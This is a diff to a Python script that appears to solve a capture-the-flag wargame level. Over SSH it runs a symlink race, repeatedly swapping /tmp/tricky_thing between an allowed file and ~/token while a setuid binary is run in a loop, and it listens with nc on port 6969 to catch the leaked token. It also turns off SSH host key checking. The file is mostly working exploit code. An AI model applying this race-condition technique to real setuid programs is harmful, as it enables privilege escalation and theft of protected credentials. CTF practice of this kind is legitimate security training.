@@ -27,7 +27,8 @@ print_output(output, 'Output')
 print_title("Binary connect to 6969 port, sniff it")
 
 dev_null = open(os.devnull, 'w')
-connect_command = f'sshpass -p {get_previous_password()} ssh {get_current_level()}@{VM_ADDRESS} -p {VM_PORT}'
+connect_command = f'sshpass -p {get_previous_password()} ssh {get_current_level()}@{VM_ADDRESS} -p {VM_PORT} ' \
+                  f'-oStrictHostKeyChecking=no'
 
 print_title('Sniff 6969 port')
 command = f"{connect_command} nc -lk 6969"
@@ -51,30 +52,52 @@ print_title("Try to abuse interval?")
 print_magic('Oh, time to magic~')
 
 print_title('Infinite symbol link create')
-command = f"{connect_command} while true; do ln -s ~/token /tmp/tricky_thing; done"
-subprocess.Popen(command.split(" "), stdout=dev_null, stderr=dev_null, stdin=dev_null)
+command = f"{connect_command} while true; do ln -fs ~/level10 /tmp/tricky_thing; ln -fs ~/token /tmp/tricky_thing; done"
+a = subprocess.Popen(command.split(" "), stdout=dev_null, stderr=dev_null, stdin=dev_null)
 print_action(command)
 
 print_title('Execute binary in loop')
 command = f"{connect_command} while true; do ./level10 /tmp/tricky_thing 0.0.0.0; done"
-subprocess.Popen(command.split(" "), stdout=dev_null, stdin=dev_null, stderr=dev_null)
+b = subprocess.Popen(command.split(" "), stdout=dev_null, stdin=dev_null, stderr=dev_null)
 print_action(command)
 
 print_title('Wait until race condition do it for us...')
 
 flag_password = None
 
+
+def cleanup():
+    a.terminate()
+    b.terminate()
+    stream.terminate()
+    print_action('Terminate processes')
+    exec(client, 'killall nc')
+    exec(client, 'rm -f /tmp/tricky_thing', title='Remove tmp file')
+    exec(client, 'rm -f /tmp/test', title='Remove tmp file')
+
+
 while True:
-    if stream.stdout.readable():
-        try:
-            flag_password = stream.stdout.readline().decode('utf-8').strip()
-            if '.*( )*.' not in flag_password:
+    try:
+        flag_password = stream.stdout.readline().decode('utf-8').strip()
+        if flag_password:
+            if 'Connecting' not in flag_password \
+                    and '.*( )*.' not in flag_password \
+                    and 'test' not in flag_password \
+                    and 'send' not in flag_password \
+                    and 'Connected!' not in flag_password \
+                    and 'wrote' not in flag_password \
+                    and 'Unable' not in flag_password:
                 break
-        except UnicodeDecodeError:
-            continue
+    except UnicodeDecodeError as err:
+        continue
+    except KeyboardInterrupt:
+        cleanup()
+        exit()
 
 print_output(flag_password, 'Flag password')
 print_title('Woo-hoo!')
+
+cleanup()
 
 get_token(flag_password)
 
